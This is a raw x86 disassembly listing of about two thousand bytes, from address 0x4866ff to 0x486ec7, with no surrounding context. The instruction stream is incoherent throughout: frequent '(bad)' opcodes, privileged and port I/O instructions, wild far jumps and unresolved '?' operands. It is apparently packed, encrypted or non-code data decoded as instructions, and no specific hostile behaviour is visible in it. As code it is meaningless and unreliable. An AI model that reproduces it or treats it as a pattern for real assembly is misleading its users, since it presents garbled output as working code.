  4866ff:	jp     0x4866aa
  486701:	das    
  486702:	shr    DWORD PTR [bx+si+0x1d],cl
  486706:	std    
  486707:	adc    cl,BYTE PTR [edx]
  486709:	or     ch,ah
  48670b:	sub    DWORD PTR [ebx-0x17],ecx
  48670e:	pop    edi
  48670f:	ror    BYTE PTR [ebx+0x65],1
  486712:	pushf  
  486713:	jmp    0x486725
  486715:	ja     0x48671e
  486717:	sbb    DWORD PTR [ecx+0xf23346d],esp
  48671d:	jg     0x48669f
  48671f:	lock inc edx
  486721:	sbb    al,0x37
  486723:	clts   
  486725:	sbb    BYTE PTR [edi],al
  486727:	jmp    0x486738
  486729:	into   
  48672a:	jnp    0x48674a
  48672c:	hlt    
  48672d:	mov    cr6,eax
  486730:	add    al,0x2c
  486732:	add    al,0x72
  486734:	add    BYTE PTR [ebx+ebp*8],dl
  486737:	cmp    al,BYTE PTR [ebx+0x6c0d337f]
  48673d:	cmp    DWORD PTR [esi-0x3fa50192],ecx
  486743:	jo     0x486785
  486745:	clc    
  486746:	or     BYTE PTR [eax-0x15],dh
  486749:	sub    BYTE PTR [ecx],dh
  48674b:	(bad)  
  48674c:	int3   
  48674d:	xor    BYTE PTR [edx-0x23],0x55
  486751:	(bad)  
  486752:	stos   DWORD PTR es:[edi],eax
  486753:	push   0x2
  486755:	(bad)  
  486756:	loopne 0x4867cd
  486758:	add    ebp,DWORD PTR [ebp+ebx*4+0x5101a207]
  48675f:	jg     0x486748
  486761:	sbb    DWORD PTR [eax+0x6a],ebp
  486764:	xchg   ecx,eax
  486765:	adc    BYTE PTR [ecx+edx*1+0x14],ch
  486769:	aaa    
  48676a:	(bad)  
  48676b:	xchg   esi,eax
  48676c:	adc    BYTE PTR [eax+0x54c3beea],bh
  486772:	xchg   DWORD PTR [edx+0x12],edx
  486775:	int3   
  486776:	je     0x4867ed
  486778:	xor    al,0xe8
  48677a:	aam    0x8
  48677c:	mov    eax,0x992f1ed4
  486781:	(bad)  
  486782:	sub    eax,ecx
  486784:	adc    al,0x18
  486786:	add    DWORD PTR [edi],edx
  486788:	inc    esp
  486789:	inc    eax
  48678a:	inc    edx
  48678b:	and    al,0x8d
  48678d:	mov    eax,ds:0xb829c211
  486792:	xlat   BYTE PTR ds:[ebx]
  486793:	add    cl,BYTE PTR [esi-0x2e16bfdc]
  486799:	jl     0x486741
  48679b:	cmp    eax,DWORD PTR [ebx+0x1f]
  48679e:	or     eax,0x2fc34bb2
  4867a3:	push   edx
  4867a4:	call   0xde631339
  4867a9:	rcl    BYTE PTR [ebp+0x4],cl
  4867ac:	mov    eax,0xdc2d6e16
  4867b1:	pop    ebx
  4867b2:	add    DWORD PTR [edx],0xffffffcb
  4867b5:	add    BYTE PTR [edi+ebp*8+0x0],0x16
  4867ba:	pushf  
  4867bb:	lods   eax,DWORD PTR ds:[esi]
  4867bc:	add    BYTE PTR [eax],ah
  4867be:	xchg   DWORD PTR [ecx],ebp
  4867c0:	inc    esp
  4867c1:	inc    esi
  4867c2:	in     eax,0x83
  4867c4:	add    eax,0xe20799c3
  4867c9:	add    eax,0xc0a05b73
  4867ce:	mov    bl,0x7a
  4867d0:	jnp    0x48677c
  4867d2:	sbb    ebx,ebx
  4867d4:	adc    ah,BYTE PTR [esi+edi*1-0x45fbb154]
  4867db:	cs mov ch,0x32
  4867de:	ins    BYTE PTR es:[edi],dx
  4867df:	adc    eax,0xff7f3073
  4867e4:	mov    bh,0x3
  4867e6:	jmp    0x4867a7
  4867e8:	xor    al,BYTE PTR [esi+0x4]
  4867eb:	cmp    eax,0x1b
  4867ee:	jg     0x486803
  4867f0:	je     0x486820
  4867f2:	clc    
  4867f3:	sub    DWORD PTR [eax],ecx
  4867f5:	push   es
  4867f6:	je     0x48680e
  4867f8:	add    dl,al
  4867fa:	rep outs dx,DWORD PTR ds:[esi]
  4867fc:	adc    al,BYTE PTR [esp+esi*2]
  4867ff:	pop    ds
  486800:	jmp    0x486824
  486802:	add    eax,0xffffffdb
  486805:	jb     0x486847
  486807:	jge    0x48680b
  486809:	les    esi,FWORD PTR [esp+edi*8-0x41]
  48680d:	js     0x486838
  48680f:	adc    ecx,DWORD PTR [ebp+0x50b0c3f]
  486815:	add    DWORD PTR [ecx],0x27
  486818:	rol    BYTE PTR [ebp+0x7c2540e6],0x8a
  48681f:	push   es
  486820:	mov    ebx,0xda60531e
  486825:	push   cs
  486826:	shl    BYTE PTR [ecx],0x15
  486829:	xchg   DWORD PTR [eax],eax
  48682b:	daa    
  48682c:	clc    
  48682d:	jnp    0x4867f1
  48682f:	sbb    edx,DWORD PTR [eax+0x34]
  486832:	add    BYTE PTR [ecx],dl
  486834:	gs adc al,dl
  486837:	push   es
  486838:	loopne 0x48683f
  48683a:	push   ebx
  48683b:	adc    DWORD PTR [eax+eax*2-0x70],0xfffffff7
  486840:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  486841:	aaa    
  486842:	(bad)  
  486843:	or     edx,ebx
  486845:	adc    BYTE PTR [edi+0x5d],0x40
  486849:	les    edi,FWORD PTR [esi+0x4]
  48684c:	pop    esp
  48684d:	(bad)  
  48684e:	dec    ecx
  48684f:	daa    
  486850:	push   edi
  486851:	sub    dl,BYTE PTR [ebp+0xf14191e]
  486857:	jmp    0x48687a
  486859:	add    eax,0x3e0d040b
  48685e:	jne    0x486874
  486860:	pop    ss
  486861:	iret   
  486862:	adc    eax,0xc70d82a7
  486867:	add    ah,BYTE PTR [ebp+0x4647793d]
  48686d:	xor    ah,BYTE PTR ds:0x680a887
  486873:	pop    ebx
  486874:	ret    
  486875:	sub    ch,BYTE PTR [esi]
  486877:	pop    es
  486878:	add    eax,0xbc15b2ef
  48687d:	sbb    bh,BYTE PTR [esi]
  48687f:	mov    edi,0x2275df32
  486884:	sti    
  486885:	cld    
  486886:	and    ch,al
  486888:	dec    eax
  486889:	lahf   
  48688a:	cmc    
  48688b:	and    esp,DWORD PTR [esi-0x7d]
  48688e:	or     BYTE PTR [ebx],bl
  486890:	adc    esp,ebx
  486892:	and    BYTE PTR [esp+ebx*1+0x27],dh
  486896:	and    BYTE PTR [bp+di+0x5216],dl
  48689b:	psllq  mm1,mm3
  48689e:	enter  0x4df3,0x3a
  4868a2:	sbb    DWORD PTR [esp+ecx*1],edx
  4868a5:	inc    edx
  4868a6:	dec    esp
  4868a7:	mov    ch,0xe0
  4868a9:	je     0x2d2c4250
  4868af:	jne    0x486914
  4868b1:	and    ebp,DWORD PTR [eax+0x146a1c27]
  4868b7:	mov    bh,0xd7
  4868b9:	inc    eax
  4868ba:	mov    esp,0xeb7d5024
  4868bf:	mov    bl,0x1
  4868c1:	aaa    
  4868c2:	sbb    DWORD PTR [eax-0x67],0xed8e3b91
  4868c9:	mov    ds:0xd445c7f0,al
  4868ce:	sub    al,0x9
  4868d0:	imul   ebx,DWORD PTR [edx+0x21],0xffffffa0
  4868d4:	dec    eax
  4868d5:	add    ah,al
  4868d7:	les    ecx,FWORD PTR [ecx-0x621df9b]
  4868dd:	jne    0x4868a3
  4868df:	xchg   ebx,eax
  4868e0:	inc    edi
  4868e1:	aaa    
  4868e2:	adc    DWORD PTR [edx+edx*8-0x8984fa4],0x4a8271a6
  4868ed:	out    dx,eax
  4868ee:	dec    DWORD PTR [esp+eiz*4]
  4868f1:	int    0xd6
  4868f3:	sbb    eax,DWORD PTR [ebx+ebp*1]
  4868f6:	sub    al,0xc7
  4868f8:	pusha  
  4868f9:	icebp  
  4868fa:	and    cl,bl
  4868fc:	adc    DWORD PTR [ecx+0x39],ebp
  4868ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  486900:	fld    QWORD PTR [esi+0x536145ec]
  486906:	sub    esi,0xffffffe3
  486909:	popa   
  48690a:	xchg   DWORD PTR [esi-0x18],esp
  48690d:	mov    eax,0xa45f107
  486912:	jo     0x486928
  486914:	outs   dx,BYTE PTR ds:[esi]
  486915:	shl    BYTE PTR [eax],1
  486917:	into   
  486918:	das    
  486919:	pop    edi
  48691a:	repz pop es
  48691c:	loop   0x486939
  48691e:	pop    esi
  48691f:	dec    ecx
  486920:	arpl   WORD PTR [edx],ax
  486922:	je     0x486964
  486924:	mov    eax,ds:0x80c48e5d
  486929:	mov    bh,0xf4
  48692b:	push   esi
  48692c:	push   ebx
  48692d:	fwait
  48692e:	sti    
  48692f:	nop
  486930:	or     eax,0xfc01fa93
  486935:	mov    DWORD PTR [edx+0x31f4331d],eax
  48693b:	xchg   edi,eax
  48693c:	nop
  48693d:	(bad)  
  48693e:	sbb    eax,0x7cf802b1
  486943:	add    BYTE PTR [esi+0x72],0x38
  486947:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  486948:	adc    DWORD PTR [eax-0x80],esi
  48694b:	leave  
  48694c:	sbb    ebp,0xffffff97
  48694f:	out    0xf4,eax
  486951:	mov    dl,0x0
  486953:	xchg   DWORD PTR [ecx],eax
  486955:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  486956:	push   edi
  486957:	or     DWORD PTR [ebx+0x312fb008],ecx
  48695d:	pop    eax
  48695e:	mov    al,ds:0x80f20dd2
  486963:	sbb    ch,bh
  486965:	push   cs
  486966:	loop   0x486905
  486968:	add    BYTE PTR [ecx+ecx*1+0x30cd32b],bl
  48696f:	xchg   ebp,eax
  486970:	adc    BYTE PTR [ebx+0x21e0186c],bh
  486976:	or     ebp,DWORD PTR [edx+0x36]
  486979:	(bad)  
  48697a:	lds    ecx,FWORD PTR [esp+ecx*8+0x4e0945b9]
  486981:	cdq    
  486982:	mov    DWORD PTR [edi+edx*8],eax
  486985:	push   eax
  486986:	and    al,0xdd
  486988:	pop    esi
  486989:	outs   dx,BYTE PTR ds:[esi]
  48698a:	or     ch,BYTE PTR [esi-0x14bbf316]
  486990:	xor    ecx,eax
  486992:	push   ecx
  486993:	cli    
  486994:	clc    
  486995:	retf   
  486996:	jne    0x4869c2
  486998:	cmp    al,0xc3
  48699a:	push   DWORD PTR [edi-0x10dc5ffc]
  4869a0:	loopne 0x4869b0
  4869a2:	push   ss
  4869a3:	push   es
  4869a4:	adc    eax,0x48234096
  4869a9:	ret    0x48af
  4869ac:	add    dl,BYTE PTR [edi-0x29ebd233]
  4869b2:	dec    esp
  4869b3:	add    dl,BYTE PTR [esi]
  4869b5:	addr16 (bad) 
  4869b7:	or     al,0xe0
  4869b9:	loopne 0x4869cd
  4869bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4869bc:	sbb    DWORD PTR [ecx+0x56dfd3c0],edx
  4869c2:	mov    al,dl
  4869c4:	sub    DWORD PTR [ecx+0x42],ebp
  4869c7:	mov    edi,0x4c229890
  4869cc:	cli    
  4869cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4869ce:	cmp    eax,0x5a722b03
  4869d3:	fstp   DWORD PTR ds:0x78d1eb00
  4869d9:	cmp    BYTE PTR [esp+eax*2-0x7d],dl
  4869dd:	out    dx,eax
  4869de:	adc    al,0xf0
  4869e0:	sub    eax,DWORD PTR [edx-0x71]
  4869e3:	(bad)  
  4869e4:	jg     0x4869e9
  4869e6:	les    eax,FWORD PTR [edx]
  4869e8:	sbb    al,0x5d
  4869ea:	ret    0xfe3b
  4869ed:	retf   0x28c2
  4869f0:	sbb    BYTE PTR [eax+0x72],0x9c
  4869f4:	xchg   ecx,eax
  4869f5:	pushf  
  4869f6:	pop    edx
  4869f7:	dec    edi
  4869f8:	fnstcw WORD PTR [eax+0x29e05e95]
  4869fe:	sub    al,0xdd
  486a00:	and    ecx,DWORD PTR [edi]
  486a02:	cmp    al,0x4b
  486a04:	test   al,0xb6
  486a06:	push   cs
  486a07:	mov    DWORD PTR es:[eax-0x28],ebx
  486a0b:	mov    bh,0x27
  486a0d:	mov    ?,WORD PTR [ebp+0x11]
  486a10:	pop    edi
  486a11:	mov    BYTE PTR [ecx],0x34
  486a14:	and    BYTE PTR [edi-0xa],bl
  486a17:	ins    BYTE PTR es:[edi],dx
  486a18:	fisttp DWORD PTR [ecx]
  486a1a:	popf   
  486a1b:	jmp    0x486a2f
  486a1d:	sub    BYTE PTR [esi+0x25],bh
  486a20:	and    dl,BYTE PTR [ebp+0x518827]
  486a26:	shl    BYTE PTR [ecx],0xc
  486a29:	test   DWORD PTR ds:0x5827d5b8,edx
  486a2f:	and    esp,DWORD PTR [eax+0x2d0e0c8f]
  486a35:	test   dl,dl
  486a37:	in     al,0xb
  486a39:	sbb    DWORD PTR [edx+0x84ac5bf],ecx
  486a3f:	dec    ecx
  486a40:	jo     0x4869f3
  486a42:	jo     0x486a94
  486a44:	out    0x41,al
  486a46:	mov    bl,0xc3
  486a48:	mul    ah
  486a4a:	imul   esi,ebp,0x2f
  486a4d:	push   ebx
  486a4e:	inc    ebp
  486a4f:	add    esp,DWORD PTR [ecx+0x4]
  486a52:	xchg   edi,eax
  486a53:	mov    BYTE PTR [edi-0x7fa725be],cl
  486a59:	mov    BYTE PTR [ecx-0x6f7b8611],bh
  486a5f:	and    al,0x0
  486a61:	or     al,0x51
  486a63:	ret    
  486a64:	or     eax,0xbf6d7682
  486a69:	dec    edi
  486a6a:	sub    al,0x12
  486a6c:	dec    esi
  486a6d:	pop    ebp
  486a6e:	xor    esp,DWORD PTR [eax+0x4a]
  486a71:	(bad)
  486a75:	add    DWORD PTR [edi+0x66c01d6b],ecx
  486a7b:	xchg   edx,eax
  486a7c:	imul   esi,DWORD PTR [edi+0x20],0xffffff97
  486a80:	adc    al,0x58
  486a82:	xchg   ebx,eax
  486a83:	loope  0x486a0e
  486a85:	push   ss
  486a86:	pusha  
  486a87:	dec    ecx
  486a88:	arpl   ax,sp
  486a8a:	(bad)  
  486a8b:	jg     0x486ac1
  486a8d:	rol    ch,cl
  486a8f:	push   esp
  486a90:	pop    ecx
  486a91:	psrlw  mm7,QWORD PTR [edx+0x4b]
  486a95:	sbb    BYTE PTR [ecx+0xe],ch
  486a98:	pop    ds
  486a99:	xor    BYTE PTR [ecx+0x4848577d],bh
  486a9f:	dec    eax
  486aa0:	shr    BYTE PTR [edi-0x7f68e5a4],1
  486aa6:	push   cs
  486aa7:	pop    esp
  486aa8:	mov    ?,WORD PTR [edi+0x1b185b83]
  486aae:	or     esp,DWORD PTR [edx+0x5d]
  486ab1:	cmp    esi,esp
  486ab3:	adc    ecx,DWORD PTR [esi+0x241d74c2]
  486ab9:	cli    
  486aba:	out    dx,eax
  486abb:	mov    cl,0x4e
  486abd:	shl    BYTE PTR [eax+edx*2],0xea
  486ac1:	or     BYTE PTR [esi],0x1d
  486ac4:	inc    edx
  486ac5:	mov    ds:0x9a718860,eax
  486aca:	fucomip st,st(5)
  486acc:	mov    ah,0x2b
  486ace:	mov    eax,0xbb0c177f
  486ad3:	pop    ebp
  486ad4:	and    BYTE PTR [edi],dh
  486ad6:	jo     0x486b00
  486ad8:	loopne 0x486a97
  486ada:	pop    ebx
  486adb:	or     eax,0x2b0094a1
  486ae0:	xor    bh,bh
  486ae2:	adc    DWORD PTR [edx],edi
  486ae4:	es hlt 
  486ae6:	shr    BYTE PTR es:[ebp+0x3c],cl
  486aea:	push   cs
  486aeb:	sbb    bh,0x42
  486aee:	push   0xffffffff
  486af0:	fist   DWORD PTR [ebp+0x36]
  486af3:	retf   0xa44
  486af6:	push   ebp
  486af7:	mov    bh,0xb5
  486af9:	or     dh,BYTE PTR [ebp+0x0]
  486afc:	xor    eax,0x90c27500
  486b01:	inc    esi
  486b02:	jmp    0x6599:0x16271835
  486b09:	fmul   DWORD PTR [ebx-0x2fb1d12c]
  486b0f:	test   al,0x69
  486b11:	cmp    eax,0x40078a68
  486b16:	push   es
  486b17:	lods   eax,DWORD PTR ds:[esi]
  486b18:	sbb    edi,esp
  486b1a:	mov    dl,al
  486b1c:	pop    ebp
  486b1d:	test   BYTE PTR ds:0x8b327814,bl
  486b23:	jo     0xcb88ece9
  486b29:	jmp    0x486b32
  486b2b:	push   ss
  486b2c:	inc    ebx
  486b2d:	je     0x486abf
  486b2f:	mov    cl,0x8f
  486b31:	dec    edi
  486b32:	or     eax,0x2e105c79
  486b37:	sbb    eax,0x18a6930f
  486b3d:	stos   BYTE PTR es:[edi],al
  486b3e:	ins    BYTE PTR es:[edi],dx
  486b3f:	mov    bh,0x55
  486b41:	push   ss
  486b42:	and    eax,DWORD PTR ds:0xe8265b6e
  486b48:	cdq    
  486b49:	cmp    bl,dh
  486b4b:	xchg   esp,eax
  486b4c:	jmp    FWORD PTR [ebx]
  486b4e:	adc    esp,DWORD PTR [edx+ebx*8-0x13c87e88]
  486b55:	cmp    BYTE PTR [eax-0x2ff4efdd],0x58
  486b5c:	mov    eax,0xe5c1c809
  486b61:	and    eax,0x57645137
  486b66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  486b67:	pop    ecx
  486b68:	or     BYTE PTR [ecx],dl
  486b6a:	dec    eax
  486b6b:	inc    edx
  486b6c:	mov    edx,DWORD PTR [ebx]
  486b6e:	dec    esp
  486b6f:	loope  0x486b46
  486b71:	mov    bh,BYTE PTR [ebx]
  486b73:	sar    BYTE PTR [esi+0x5],1
  486b76:	test   BYTE PTR [ecx+0x72c19a13],0x2d
  486b7d:	mov    BYTE PTR [esi],dl
  486b7f:	sbb    cl,BYTE PTR [eax]
  486b81:	mov    DWORD PTR [ecx+0x14c167fd],ebx
  486b87:	sub    edi,DWORD PTR [ebx]
  486b89:	push   ebx
  486b8a:	or     BYTE PTR [esi+0x9],bh
  486b8d:	adc    eax,0xcf69df89
  486b92:	and    BYTE PTR [ecx+0x26],0xc
  486b96:	adc    eax,0xfa6c4d89
  486b9b:	xor    al,BYTE PTR [eax-0x61]
  486b9e:	dec    edi
  486b9f:	xor    al,0x14
  486ba1:	je     0x486bda
  486ba3:	add    eax,0x1a53fb03
  486ba8:	es pushf 
  486baa:	bound  edi,QWORD PTR [ebp+0x58]
  486bad:	cwde   
  486bae:	xlat   BYTE PTR ds:[ebx]
  486baf:	push   esi
  486bb0:	xchg   ebx,eax
  486bb1:	sub    DWORD PTR [ebp+0x20],0xbb6fa89f
  486bb8:	mov    edx,0x33e3a784
  486bbd:	and    eax,0x5f166a28
  486bc2:	sbb    eax,0x29d35a70
  486bc7:	imul   eax,ebp,0xffffffb7
  486bca:	xor    eax,0x3b802fa1
  486bcf:	nop
  486bd0:	pop    ecx
  486bd1:	adc    al,0x89
  486bd3:	(bad)  
  486bd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  486bd6:	adc    eax,DWORD PTR [ecx-0x3c5c4d9]
  486bdc:	push   esi
  486bdd:	add    al,0xc6
  486bdf:	adc    dh,0xf
  486be2:	mov    BYTE PTR [eax+0x633e43bd],0xe5
  486be9:	dec    ebp
  486bea:	adc    BYTE PTR [edx+0x2e022b2b],cl
  486bf0:	adc    ebx,esp
  486bf2:	pop    edi
  486bf3:	pop    ss
  486bf4:	out    dx,al
  486bf5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  486bf6:	xchg   esi,eax
  486bf7:	dec    esp
  486bf8:	leave  
  486bf9:	test   eax,0x2911101
  486bfe:	lods   al,BYTE PTR ds:[esi]
  486bff:	cmp    al,0xe7
  486c01:	xor    BYTE PTR [esi+0x428ebd94],al
  486c07:	ret    0x4cb7
  486c0a:	enter  0x5537,0xcc
  486c0e:	add    dh,cl
  486c10:	cwde   
  486c11:	stc    
  486c12:	gs clc 
  486c14:	retf   0x3de1
  486c17:	dec    ebp
  486c18:	add    al,0x84
  486c1a:	ds stos BYTE PTR es:[edi],al
  486c1c:	arpl   WORD PTR [ebx+0x2],bx
  486c1f:	mov    BYTE PTR [eax+esi*8],ah
  486c22:	div    DWORD PTR [edx]
  486c24:	into   
  486c25:	cmp    eax,DWORD PTR [ecx+ebx*4]
  486c28:	adc    eax,DWORD PTR [ecx-0x66ed722f]
  486c2e:	or     BYTE PTR [eax],ch
  486c30:	sbb    bl,BYTE PTR cs:[edx]
  486c33:	jo     0x486bc8
  486c35:	cmp    BYTE PTR [eax-0x17],al
  486c38:	adc    bh,0x5
  486c3b:	xchg   esp,eax
  486c3c:	add    DWORD PTR [eax+0x1f26c4d6],esi
  486c42:	repz or bl,BYTE PTR [edx+edx*8+0x12]
  486c47:	cmp    bl,BYTE PTR [edx]
  486c49:	mov    al,ds:0x1f422f26
  486c4e:	sahf   
  486c4f:	fnstsw WORD PTR [edi]
  486c51:	aaa    
  486c52:	sbb    al,0x37
  486c54:	fsubrp st(6),st
  486c56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  486c57:	add    DWORD PTR [eax+ecx*4+0xf],ecx
  486c5b:	retf   
  486c5c:	sub    eax,DWORD PTR [ecx]
  486c5e:	(bad)
  486c62:	and    eax,0x3801478d
  486c67:	xchg   dl,cl
  486c69:	or     eax,0x9ec0e0f5
  486c6e:	mov    esi,0xa85c3950
  486c73:	out    0x28,eax
  486c75:	pusha  
  486c76:	inc    ebp
  486c77:	ror    BYTE PTR [eax],0xc1
  486c7a:	outs   dx,DWORD PTR ds:[esi]
  486c7b:	jae    0x486c0d
  486c7d:	inc    edi
  486c7e:	sar    al,0x68
  486c81:	pop    eax
  486c82:	ja     0x486c17
  486c84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  486c85:	cld    
  486c86:	xlat   BYTE PTR ds:[ebx]
  486c87:	xor    esi,ebp
  486c89:	das    
  486c8a:	mov    BYTE PTR [esi],cl
  486c8c:	ins    DWORD PTR es:[edi],dx
  486c8d:	mov    DWORD PTR [eax+edx*8+0x3241c74],eax
  486c94:	repnz add esi,esp
  486c97:	ret    
  486c98:	add    eax,0x4d
  486c9b:	or     DWORD PTR [edi+0x5f],esi
  486c9e:	xchg   edx,eax
  486c9f:	shl    DWORD PTR [eax],0x5c
  486ca2:	add    ah,BYTE PTR [ebx]
  486ca4:	add    ebx,DWORD PTR [edx+0x4d8420f0]
  486caa:	mov    bh,0xc4
  486cac:	hlt    
  486cad:	out    0x74,eax
  486caf:	and    eax,0x24e219c
  486cb4:	inc    eax
  486cb5:	ja     0x486cc5
  486cb7:	ror    BYTE PTR [eax+0xd],0x42
  486cbb:	jns    0x486cc7
  486cbd:	jecxz  0x486c99
  486cbf:	lahf   
  486cc0:	inc    ebp
  486cc1:	or     eax,0x31540deb
  486cc6:	fadd   st,st(0)
  486cc8:	mov    esi,0x83d84e90
  486ccd:	es push 0xfffffff8
  486cd0:	sub    edx,ebx
  486cd2:	ret    
  486cd3:	ret    0x59af
  486cd6:	adc    al,BYTE PTR [edi+0x5c]
  486cd9:	sbb    BYTE PTR [ebp-0x2204dfbf],ch
  486cdf:	adc    eax,0x6ba84091
  486ce4:	imul   ebp,DWORD PTR [edi+ebx*1],0x548212b
  486ceb:	test   BYTE PTR [ecx],cl
  486ced:	add    eax,0x46430449
  486cf2:	lods   al,BYTE PTR ds:[esi]
  486cf3:	sub    BYTE PTR [eax],bl
  486cf5:	push   esp
  486cf6:	cmp    al,0x57
  486cf8:	pop    es
  486cf9:	sbb    al,0x58
  486cfb:	xor    al,0xc4
  486cfd:	inc    DWORD PTR [ebp+0x3b416a99]
  486d03:	cmovle eax,DWORD PTR [edi+ebp*2+0x39]
  486d08:	inc    edi
  486d09:	jl     0x486d0f
  486d0b:	add    BYTE PTR ds:0x2a4b0b49,dh
  486d11:	sar    BYTE PTR [eax-0x70b9379d],0xb6
  486d18:	mov    cl,0x74
  486d1a:	sbb    ecx,esi
  486d1c:	sbb    edi,DWORD PTR [ecx-0x7a]
  486d1f:	mov    ah,0xff
  486d21:	pusha  
  486d22:	dec    edi
  486d23:	jne    0x486cf5
  486d25:	cmp    DWORD PTR [eax+0x77133600],ebx
  486d2b:	and    BYTE PTR [esi-0x776741ba],al
  486d31:	dec    ebp
  486d32:	sti    
  486d33:	mov    edi,edx
  486d35:	hlt    
  486d36:	adc    eax,0xd0dec9ca
  486d3b:	and    DWORD PTR [esi+0x79],edi
  486d3e:	mov    esp,eax
  486d40:	add    al,0x3
  486d42:	arpl   WORD PTR [ebx-0x20f94525],sp
  486d48:	xchg   esp,eax
  486d49:	bound  edx,QWORD PTR [ecx-0x77e328f1]
  486d4f:	inc    edi
  486d50:	or     edi,DWORD PTR [eax]
  486d52:	cdq    
  486d53:	push   ebp
  486d54:	scas   al,BYTE PTR es:[edi]
  486d55:	adc    DWORD PTR [eax],esp
  486d57:	push   ss
  486d58:	mov    dh,0xd
  486d5a:	or     al,0x2c
  486d5c:	dec    edi
  486d5d:	or     esi,DWORD PTR [edi+0x16]
  486d60:	mov    al,0x2a
  486d62:	(bad)
  486d65:	push   ss
  486d66:	lea    ebp,[ebx+esi*1]
  486d69:	or     eax,0xe12a3443
  486d6e:	or     DWORD PTR [eax],eax
  486d70:	(bad)  
  486d71:	punpcklbw mm2,DWORD PTR [ebx]
  486d74:	mov    bh,0x86
  486d76:	test   DWORD PTR [ebx],ecx
  486d78:	mov    edx,0xc378251e
  486d7d:	cmp    ah,al
  486d7f:	(bad)  ds:0x3f350a09
  486d85:	or     eax,DWORD PTR [ecx]
  486d87:	fstp   QWORD PTR [ebx-0x2c]
  486d8a:	and    bl,bh
  486d8c:	or     DWORD PTR [eax-0x65344741],eax
  486d92:	js     0x486d5b
  486d94:	adc    ebp,edx
  486d96:	into   
  486d97:	inc    edi
  486d98:	xor    BYTE PTR [ebx],bh
  486d9a:	fwait
  486d9b:	adc    ch,BYTE PTR [edx]
  486d9d:	and    al,0x2c
  486d9f:	fidivr WORD PTR [ebp+0x48]
  486da2:	fbld   TBYTE PTR [eax+0x5005c7f0]
  486da8:	pushf  
  486da9:	cwde   
  486daa:	nop
  486dab:	out    0x30,eax
  486dad:	lea    eax,[ebp-0x3f0b1387]
  486db3:	sub    edx,DWORD PTR [ecx+0x5b]
  486db6:	lahf   
  486db7:	fisubr DWORD PTR [ebp+ebp*1-0x4]
  486dbb:	add    BYTE PTR [eax+eax*4],dh
  486dbe:	repnz add DWORD PTR [edx-0x4d],edx
  486dc2:	push   0x8b99c84
  486dc7:	pop    esp
  486dc8:	xchg   edi,eax
  486dc9:	xor    eax,0x3b022ec4
  486dce:	add    al,0xf7
  486dd0:	jmp    0xe7eb7c9
  486dd5:	das    
  486dd6:	bound  esi,QWORD PTR [ecx-0x1c9099ff]
  486ddc:	mov    esi,0x20de6ced
  486de1:	and    eax,0x2c108614
  486de6:	data16 cld 
  486de8:	xor    DWORD PTR ds:0x37774600,0x1b4815c8
  486df2:	sbb    eax,0x2e8217b
  486df7:	sbb    BYTE PTR [esi],0x50
  486dfa:	add    al,0x6a
  486dfc:	or     BYTE PTR [ebp-0x63941c9d],al
  486e02:	or     al,0xff
  486e04:	push   ebp
  486e05:	fs loop 0x486dd8
  486e08:	sbb    BYTE PTR [ebx+0xbb69f04],ch
  486e0e:	dec    edi
  486e0f:	sbb    BYTE PTR ds:0xa0d489d5,dl
  486e15:	xor    dh,al
  486e17:	mov    cl,0xc3
  486e19:	scas   eax,DWORD PTR es:[edi]
  486e1a:	retf   0x99f1
  486e1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  486e1e:	mov    cl,0x2
  486e20:	(bad)  
  486e21:	ror    BYTE PTR [eax+0xb],1
  486e24:	in     al,0x17
  486e26:	(bad)  
  486e27:	(bad)  
  486e28:	jo     0x486dec
  486e2a:	jge    0x486ea0
  486e2c:	ins    BYTE PTR es:[edi],dx
  486e2d:	jbe    0x486e11
  486e2f:	pop    es
  486e30:	add    DWORD PTR ds:0x89b056ee,eax
  486e36:	pop    ss
  486e37:	jmp    0x486e04
  486e39:	xor    DWORD PTR [edi+ebp*1+0x102617bc],0x10
  486e41:	mov    DWORD PTR [ecx],edx
  486e43:	jecxz  0x486eb2
  486e45:	imul   ebx,DWORD PTR [edx-0x1df2f3ef],0x13890c5d
  486e4f:	imul   esp,DWORD PTR [esi+ebp*1-0x53f3ebbc],0x1a
  486e57:	xor    cl,BYTE PTR [ebx+ebp*2-0x6bf7b117]
  486e5e:	je     0xfdef2b39
  486e64:	or     BYTE PTR [eax],dl
  486e66:	sbb    bh,BYTE PTR [ebx]
  486e68:	add    al,0x2c
  486e6a:	fxam   
  486e6c:	xor    al,0xae
  486e6e:	add    esp,eax
  486e70:	out    0xa7,al
  486e72:	mov    al,ds:0x45702461
  486e77:	sub    esi,eax
  486e79:	xchg   ebp,eax
  486e7a:	fld    QWORD PTR [edi]
  486e7c:	imul   edx,edi,0x67a103a9
  486e82:	call   0x4075:0x47db491c
  486e89:	mov    ds:0x9113441d,eax
  486e8e:	pop    esi
  486e8f:	jne    0x486eee
  486e91:	dec    ecx
  486e92:	sbb    al,0xa3
  486e94:	lds    edi,FWORD PTR [eax]
  486e96:	rcr    cl,cl
  486e98:	push   0x9
  486e9a:	fnsave [edx+0x6d]
  486e9d:	inc    esi
  486e9e:	pusha  
  486e9f:	stos   DWORD PTR es:[edi],eax
  486ea0:	sub    eax,DWORD PTR [esi-0x17]
  486ea3:	outs   dx,DWORD PTR ds:[esi]
  486ea4:	jp     0x486ee6
  486ea6:	jecxz  0x486efe
  486ea8:	ror    BYTE PTR [ebp-0x51],1
  486eab:	sub    ecx,DWORD PTR [ebp-0x59]
  486eae:	sub    edx,ecx
  486eb0:	in     al,dx
  486eb1:	test   BYTE PTR [ecx],al
  486eb3:	das    
  486eb4:	dec    ebx
  486eb5:	(bad)  
  486eb6:	call   0xb097ba46
  486ebb:	sar    BYTE PTR [eax],1
  486ebd:	and    ecx,DWORD PTR [edx+0x73]
  486ec0:	rcl    BYTE PTR [esi],cl
  486ec2:	shr    BYTE PTR [ecx],cl
  486ec4:	adc    BYTE PTR [esi],bl
  486ec6:	clc    
  486ec7:	clc    
